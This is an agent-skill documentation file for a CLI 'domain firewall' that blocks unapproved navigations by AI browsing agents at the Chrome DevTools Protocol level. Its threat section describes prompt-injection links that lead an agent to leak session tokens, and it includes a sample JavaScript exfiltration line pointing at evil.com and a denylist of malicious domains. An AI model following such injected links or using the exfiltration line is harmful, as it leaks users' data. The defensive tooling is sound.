---
name: domain-firewall
description: Protect browser sessions from unauthorized navigations. Use when the user wants to restrict which domains an AI agent can navigate to, block malicious links, prevent prompt injection redirects, or add navigation security to browser automation.
license: MIT
allowed-tools: Bash
metadata:
  openclaw:
    requires:
      bins: [bb, node]
    install:
      - kind: node
        package: ws
---

# Domain Firewall — Navigation Security for Browser Agents

Protect any Browserbase or local Chrome session from unauthorized navigations. One CLI command intercepts every navigation at the Chrome DevTools Protocol level and enforces domain policies — no code changes required.

## Setup

Install the dependency before first use:

```bash
cd .claude/skills/domain-firewall && npm install
```

## Quick Start

```bash
# 1. Create a Browserbase session
SESSION_ID=$(bb sessions create --body '{"projectId":"'"$(bb projects list | jq -r '.[0].id')"'","keepAlive":true}' | jq -r .id)

# 2. Attach the firewall
node .claude/skills/domain-firewall/scripts/domain-firewall.mjs \
  --session-id $SESSION_ID \
  --allowlist "docs.stripe.com,stripe.com,*.stripe.com" \
  --default deny

# Or for local Chrome (with --remote-debugging-port=9222):
node .claude/skills/domain-firewall/scripts/domain-firewall.mjs \
  --cdp-url "ws://localhost:9222/devtools/browser/..." \
  --allowlist "localhost,example.com" \
  --default deny
```

The firewall runs in the foreground. Allowed navigations pass through silently. Blocked navigations are killed at the CDP level — the browser shows `ERR_BLOCKED_BY_CLIENT` and the attacker receives nothing.

## Why This Matters

AI agents browsing on behalf of users are vulnerable to navigation-based attacks:

- **Prompt injection links**: A page contains a malicious link disguised as a "required step." The agent clicks it and navigates to an attacker-controlled URL carrying session tokens.
- **Open redirects**: A trusted domain redirects to an attacker site via `Location` header or `<meta http-equiv="refresh">`.
- **JavaScript-triggered navigation**: A script calls `window.location = "https://evil.com/exfil?data=..."` after the page loads.
- **Data exfiltration**: The URL itself carries stolen data — even if the page never loads, the request was sent.

Application-level URL validation only catches explicit `goto()` calls. It misses redirects, meta refreshes, link clicks, and JS-initiated navigations.

The domain firewall operates at the **protocol level** — below the browser engine. Every network request, regardless of how it was triggered, passes through the gate before leaving the browser.

## Agent Workflow

The typical workflow for a coding agent using the `browse` CLI:

```bash
# 1. Create a Browserbase session
SESSION_ID=$(bb sessions create --body '{"projectId":"'"$(bb projects list | jq -r '.[0].id')"'","keepAlive":true}' | jq -r .id)

# 2. Attach the firewall (runs in background)
node .claude/skills/domain-firewall/scripts/domain-firewall.mjs \
  --session-id $SESSION_ID \
  --allowlist "docs.stripe.com,stripe.com,*.stripe.com" \
  --default deny &

# 3. Browse normally — firewall is transparent
browse open https://docs.stripe.com --session-id $SESSION_ID
browse snapshot
# ... agent works normally ...

# 4. If the agent or page tries to navigate to an unlisted domain → BLOCKED
#    Firewall logs the decision to stderr in real-time:
#    [14:30:05] BLOCKED  evil.com  (default)

# 5. Stop the firewall when done
kill %1
```

## CLI Reference

```
domain-firewall.mjs — Protect a browser session with domain policies

Usage:
  node .claude/skills/domain-firewall/scripts/domain-firewall.mjs --session-id <id> [options]
  node .claude/skills/domain-firewall/scripts/domain-firewall.mjs --cdp-url <ws://...> [options]

Options:
  --session-id <id>      Browserbase session ID
  --cdp-url <url>        Direct CDP WebSocket URL (local Chrome)
  --allowlist <domains>  Comma-separated allowed domains
  --denylist <domains>   Comma-separated denied domains
  --default <verdict>    Default verdict: allow or deny (default: deny)
  --quiet                Suppress per-request logging
  --json                 Log events as JSON lines
  --help                 Show this help

Environment:
  BROWSERBASE_API_KEY    Required when using --session-id
```

### Getting the CDP URL

**Browserbase sessions** — the script resolves the CDP URL automatically via `bb sessions debug`:

```bash
node .claude/skills/domain-firewall/scripts/domain-firewall.mjs --session-id 25104007-3523-46f8-acba-ad529a3f538e
```

**Local Chrome** — launch Chrome with remote debugging, then pass the WebSocket URL:

```bash
# Launch Chrome
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
  --remote-debugging-port=9222 --headless=new about:blank

# Get the browser CDP URL
curl -s http://localhost:9222/json/version | jq -r .webSocketDebuggerUrl
# → ws://localhost:9222/devtools/browser/...

# Start firewall
node .claude/skills/domain-firewall/scripts/domain-firewall.mjs --cdp-url "ws://localhost:9222/devtools/browser/..." \
  --allowlist "localhost" --default deny
```

### Output

Default (human-readable, written to stdout):

```
[firewall] Connected.
[firewall] Attached to page target.
[firewall] Allowlist: docs.stripe.com, stripe.com
[firewall] Default: deny
[firewall] Listening for navigations...

[14:30:01] ALLOWED  docs.stripe.com          (allowlist)
[14:30:05] BLOCKED evil.com                  (default)
[14:30:08] ALLOWED  stripe.com               (allowlist)
```

JSON mode (`--json`):

```json
{"time":"14:30:01","domain":"docs.stripe.com","url":"https://docs.stripe.com/docs","action":"ALLOWED","policy":"allowlist"}
{"time":"14:30:05","domain":"evil.com","url":"https://evil.com/steal","action":"BLOCKED","policy":"default"}
```

## How It Works

1. The script connects to the browser session via CDP WebSocket
2. If connected to a browser-level target, it auto-attaches to the first page target via `Target.attachToTarget`
3. Sends `Fetch.enable` with `urlPattern: "*"` to intercept all network requests
4. On every `Fetch.requestPaused` event:
   - Non-Document resources (images, CSS, JS) pass through immediately
   - Internal URLs (chrome://, about://) pass through. Note: `data:` URLs bypass CDP Fetch interception entirely (Chrome renders them inline without a network request)
   - The domain is extracted and lowercased
   - Denylist is checked first — if the domain is listed, the request is blocked
   - Allowlist is checked next — if the domain is listed, the request is allowed
   - If neither list matches, the `--default` verdict applies
5. Allowed: `Fetch.continueRequest` — navigation proceeds normally
6. Blocked: `Fetch.failRequest` with `BlockedByClient` — Chrome shows `ERR_BLOCKED_BY_CLIENT`
7. On errors: fail-closed (deny) to avoid permanently hanging the browser

## Examples

### Restrict agent to specific domains

```bash
node .claude/skills/domain-firewall/scripts/domain-firewall.mjs --session-id $SID \
  --allowlist "docs.stripe.com,stripe.com,github.com" \
  --default deny
```

### Block known-bad domains, allow everything else

```bash
node .claude/skills/domain-firewall/scripts/domain-firewall.mjs --session-id $SID \
  --denylist "evil.com,phishing-site.com,malware.download" \
  --default allow
```

### Combine allowlist and denylist

Denylist is checked first, then allowlist, then default:

```bash
node .claude/skills/domain-firewall/scripts/domain-firewall.mjs --session-id $SID \
  --denylist "ads.example.com" \
  --allowlist "example.com,cdn.example.com" \
  --default deny
```

### Pipe JSON output to a file for analysis

```bash
node .claude/skills/domain-firewall/scripts/domain-firewall.mjs --session-id $SID \
  --allowlist "example.com" --default deny --json > firewall.log &

# Later: analyze blocks
cat firewall.log | jq 'select(.action == "BLOCKED")'
```

## Best Practices

1. **Start the firewall before browsing** — run `domain-firewall.mjs` before the first `browse open` so all navigations are intercepted from the start.
2. **Include your starting URL's domain** — the allowlist must include the domain you navigate to first, otherwise it will be blocked.
3. **Use wildcards for subdomains** — `stripe.com` and `docs.stripe.com` are separate domains. Use `--allowlist "stripe.com,*.stripe.com"` to allow the base domain and all subdomains. The `*` prefix matches any subdomain (e.g. `*.stripe.com` matches `docs.stripe.com`, `api.stripe.com`). Note that `*.stripe.com` does NOT match `stripe.com` itself — include both if you need the base domain.
4. **Denylist takes priority** — a domain on both the denylist and allowlist will be denied.
5. **Use `--json` for programmatic analysis** — pipe to `jq` or save to a file for post-session review.
6. **Use `--default deny` for high-security tasks** — only explicitly allowed domains pass through. This is the default.
7. **Use `--default allow` with a denylist for low-friction browsing** — block known-bad domains while allowing general navigation.
8. **Stop the firewall when done** — press Ctrl+C in the foreground, or `kill %1` if backgrounded with `&`. The firewall disables Fetch interception on shutdown.

## Troubleshooting

- **"Failed to get CDP URL"**: Make sure the session is RUNNING (`bb sessions get <id>`) and `BROWSERBASE_API_KEY` is set.
- **"Unexpected server response: 500"**: Another CDP client is connected to the page target. The script now auto-attaches via the browser target to avoid this — use the browser-level WebSocket URL (`/devtools/browser/...`), not the page-level one.
- **Navigation timeout after block**: Expected. `Fetch.failRequest` causes `goto()` to reject. Wrap navigation in `.catch()`.
- **Sub-resources blocked**: The `resourceType !== "Document"` filter passes through images/CSS/JS. If sub-resources are being blocked, the page's fetch/XHR requests may be Document-typed — this is rare.
- **Firewall not catching clicks**: Verify the script is running and shows "Listening for navigations..." in the output.

## Advanced: Code Integration (TypeScript API)

For developers who want to embed the firewall directly in Stagehand projects with composable policies, see [REFERENCE.md](REFERENCE.md) for the full TypeScript API including:

- `installDomainFirewall(page, config)` — install directly on a Stagehand page
- Five built-in policy factories: `allowlist()`, `denylist()`, `pattern()`, `tld()`, `interactive()`
- Composable policy chains with three-value verdicts (`allow` / `deny` / `abstain`)
- Human-in-the-loop approval with session memory

For detailed usage examples, see [EXAMPLES.md](EXAMPLES.md).
